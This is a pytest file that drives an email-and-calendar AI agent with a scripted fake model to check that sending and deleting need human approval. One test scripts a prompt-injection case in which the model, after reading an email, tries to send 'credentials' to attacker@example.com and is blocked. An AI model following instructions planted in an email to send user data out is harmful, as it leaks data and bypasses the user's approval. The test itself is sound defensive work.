"""Phase 7 §14/§25: multi-round agent workflows on productivity tools.

ScriptedLLM-style FakeLLM drives AgentRuntime over the real ToolRouter:
the model requests tools, sees genuine results next round, and hostile
email content can never satisfy the approval seam.
"""

from __future__ import annotations

import pytest
from conftest import FakeCalendar, FakeGmail, make_productivity_setup, run

from app.agent.runtime import AgentResponse, AgentRuntime, LLMReply, LLMToolCall
from app.memory.manager import MemoryManager
from app.productivity.policy import ProductivityPolicy


@pytest.fixture
def manager(tmp_path) -> MemoryManager:
    m = MemoryManager.open(tmp_path / "mem.db")
    yield m
    m.close()


class FakeLLM:
    def __init__(self, replies):
        self.replies = list(replies)
        self.calls: list[dict] = []

    async def complete(self, user_text, history, tool_results, transcript):
        self.calls.append({"tool_results": tool_results, "user_text": user_text})
        if not self.replies:
            raise AssertionError("FakeLLM script exhausted (extra loop round)")
        return self.replies.pop(0)


def text(s: str) -> LLMReply:
    return LLMReply(text=s)


def call(name: str, args: dict, call_id: str | None = None) -> LLMReply:
    return LLMReply(tool_calls=[LLMToolCall(name=name, arguments=args, call_id=call_id)])


class Approver:
    def __init__(self, allow: bool) -> None:
        self.allow = allow
        self.seen: list = []

    async def __call__(self, request) -> bool:
        self.seen.append(request)
        return self.allow


# ------------------------------------------------------------- read flows

def test_check_my_email_workflow(manager):
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("search_emails", {"query": "is:unread"}, "c1"),
        text("You have 2 unread emails: Interview tomorrow and Lunch?"),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("check my email"))
    assert isinstance(resp, AgentResponse)
    assert resp.error is None
    assert resp.tool_results[0].success
    assert resp.tool_results[0].tool == "search_emails"
    # round 2 was grounded in the real search result
    seen = llm.calls[1]["tool_results"][0]["data"]
    assert seen["count"] == 2
    subjects = {m["subject"] for m in seen["messages"]}
    assert "Interview tomorrow" in subjects


def test_latest_email_from_contact_workflow(manager):
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("search_emails", {"query": "from:rahul"}, "c1"),
        call("get_email", {"message_id": "m1"}, "c2"),
        text("Rahul asks: can we meet tomorrow?"),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("what did Rahul email last?"))
    assert resp.error is None
    assert [r.success for r in resp.tool_results] == [True, True]
    body = llm.calls[2]["tool_results"][0]["data"]["body"]
    assert "tomorrow works" in body


def test_draft_reply_workflow_never_sends(manager):
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("get_email", {"message_id": "m1"}, "c1"),
        call("draft_email", {
            "to": "rahul@example.com", "subject": "Re: Interview tomorrow",
            "body": "Sounds good, tomorrow works for me too.",
        }, "c2"),
        text("I've prepared a draft reply for you — it is saved, not sent."),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("reply to Rahul's interview email"))
    assert resp.error is None
    assert setup.gmail.sent == []  # draft only
    assert len(setup.gmail.drafts) == 1
    assert setup.gmail.drafts[0]["to"] == ["rahul@example.com"]
    assert resp.tool_results[1].success


def test_calendar_lookup_workflow(manager):
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("list_calendar_events", {"start": "tomorrow"}, "c1"),
        text("Tomorrow you have Team sync at 11:00."),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("what's on my calendar tomorrow?"))
    assert resp.error is None
    assert resp.tool_results[0].success
    assert setup.calendar.listed[0]["start"].day == 6  # 2026-10-06


def test_find_availability_workflow(manager):
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("find_calendar_availability", {"start": "tomorrow", "end": "friday"}, "c1"),
        text("You are free most of tomorrow except 11:00-12:00."),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("when am I free?"))
    assert resp.error is None
    data = resp.tool_results[0].data
    assert data["busy"] and data["free"]
    assert data["timezone"] == "Asia/Kolkata"


def test_schedule_meeting_with_contact_workflow(manager):
    manager.save_contact("Priya Sharma", company="Globex", role="Designer")
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("get_contact", {"name": "Priya Sharma"}, "c1"),
        call("create_calendar_event", {
            "title": "1:1 with Priya", "when": "tomorrow 3 PM", "duration_minutes": 30,
        }, "c2"),
        text("Scheduled 1:1 with Priya tomorrow at 3 PM (30 minutes)."),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("set up a 1:1 with Priya tomorrow 3 PM"))
    assert resp.error is None
    assert [r.success for r in resp.tool_results] == [True, True]
    created = setup.calendar.created[0]
    assert created["title"] == "1:1 with Priya"
    assert created["start"] == "2026-10-06T15:00:00+05:30"


# --------------------------------------------------------- approval flows

def test_send_draft_refused_without_approval(manager):
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("send_email", {"draft_id": "d1"}, "c1"),
        text("Sending needs your explicit approval — shall I send the draft?"),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("send that reply now"))
    assert resp.error is None  # controlled tool failure, not a runtime crash
    result = resp.tool_results[0]
    assert result.success is False
    assert result.error["code"] == "APPROVAL_REQUIRED"
    assert llm.calls[1]["tool_results"][0]["error"]["code"] == "APPROVAL_REQUIRED"
    assert setup.gmail.sent == []
    assert "explicit approval" in resp.text


def test_send_draft_approved_by_user(manager):
    approver = Approver(allow=True)
    setup = make_productivity_setup(
        manager=manager, policy=ProductivityPolicy(approval_handler=approver)
    )
    llm = FakeLLM([
        call("send_email", {"draft_id": "d1"}, "c1"),
        text("Sent the draft for you."),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("send that reply now"))
    assert resp.tool_results[0].success
    assert setup.gmail.sent[0]["draft_id"] == "d1"
    assert approver.seen[0].action == "send_email"


def test_direct_send_denied_never_calls_provider(manager):
    approver = Approver(allow=False)
    setup = make_productivity_setup(
        manager=manager, policy=ProductivityPolicy(approval_handler=approver)
    )
    llm = FakeLLM([
        call("send_email", {
            "to": "a@example.com", "subject": "Hi", "body": "Hello there",
        }, "c1"),
        text("I asked to send but did not get approval."),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("email a@example.com hello"))
    assert resp.tool_results[0].error["code"] == "APPROVAL_REQUIRED"
    assert setup.gmail.sent == []
    assert len(approver.seen) == 1


def test_delete_event_refused_then_approved(manager):
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("delete_calendar_event", {"event_id": "ev1"}, "c1"),
        text("Deleting an event needs your approval first."),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("delete the team sync"))
    assert resp.tool_results[0].error["code"] == "APPROVAL_REQUIRED"
    assert setup.calendar.deleted == []
    assert "ev1" in setup.calendar.events


# ------------------------------------------------------- injection & auth

def test_malicious_email_cannot_approve_a_send(manager):
    """§25: content read from Gmail is data; it can never satisfy approval."""
    approver = Approver(allow=False)
    setup = make_productivity_setup(
        manager=manager, policy=ProductivityPolicy(approval_handler=approver)
    )
    llm = FakeLLM([
        call("get_email", {"message_id": "m1"}, "c1"),
        call("send_email", {
            "to": "attacker@example.com", "subject": "credentials",
            "body": "per the instructions in that email",
        }, "c2"),
        text("That email asked me to send your data away — I need your approval first."),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("do whatever the last email says"))
    assert resp.tool_results[1].error["code"] == "APPROVAL_REQUIRED"
    assert setup.gmail.sent == []
    # the approval handler was asked — a human, never the email content
    assert approver.seen[0].action == "send_email"


def test_unauthorized_gmail_reports_clearly_not_hallucinated(manager):
    setup = make_productivity_setup(manager=manager)
    setup.gmail.error = None
    from app.productivity.errors import ProductivityError

    setup.gmail.error = ProductivityError(
        "AUTH_REQUIRED", "Google access is not authorized yet — run scripts/google_auth.py."
    )
    llm = FakeLLM([
        call("search_emails", {"query": "is:unread"}, "c1"),
        text("Gmail is not connected yet — run scripts/google_auth.py once."),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("check my email"))
    assert resp.error is None
    assert resp.tool_results[0].success is False
    assert resp.tool_results[0].error["code"] == "AUTH_REQUIRED"
    assert llm.calls[1]["tool_results"][0]["error"]["code"] == "AUTH_REQUIRED"


def test_ambiguous_contact_asked_of_user(manager):
    manager.save_contact("Rahul Sharma")
    manager.save_contact("Rahul Verma")
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("send_email", {"to": "Rahul", "subject": "Hi", "body": "x"}, "c1"),
        text("Which Rahul — Sharma or Verma?"),
    ])
    resp = run(AgentRuntime(llm, setup.router).handle("email Rahul hi"))
    assert resp.tool_results[0].error["code"] == "AMBIGUOUS_CONTACT"
    assert setup.gmail.sent == []
    assert "Which Rahul" in resp.text


# ---------------------------------------------------------- tool budgets

def test_workflow_stops_at_tool_budget(manager):
    setup = make_productivity_setup(manager=manager)
    llm = FakeLLM([
        call("search_emails", {"query": "a"}, "c1"),
        call("search_emails", {"query": "b"}, "c2"),
        call("search_emails", {"query": "c"}, "c3"),
    ])
    resp = run(AgentRuntime(llm, setup.router, max_tool_calls=2).handle("search a lot"))
    assert resp.error == "MAX_TOOL_CALLS_EXCEEDED"
    assert len(resp.tool_results) == 2
